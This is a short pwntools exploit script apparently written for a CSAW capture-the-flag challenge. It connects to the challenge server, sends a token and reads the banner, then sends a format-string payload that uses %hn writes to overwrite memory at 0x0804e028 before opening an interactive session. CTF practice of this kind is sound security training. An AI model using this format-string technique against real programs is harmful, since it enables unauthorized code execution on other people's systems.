from pwn import *

io = remote('auto-pwn.chal.csaw.io', 11003)
#io = process('./real')

print(io.recv())
io.sendline(b'0619b9a41fcc3e30b1e0cc206d58c37e')
print(io.recvuntil(b'Here is the binary that is currently running on this box: \n-------------------------------------------------------------------\n'))
#fp = open('bin', 'wb')
#fp.write(io.recvuntil(b'\n-------------------------------------------------------------------'))
#fp.close()
print(io.recvuntil(b'\n-------------------------------------------------------------------'))
print(io.recv())

payload = b'AA'+p32(0x0804e028+2)+p32(0x0804e028)+b'%2042x'+b'%6$hn'+b'%36594x'+b'%7$hn'
io.sendline(payload)
io.interactive()
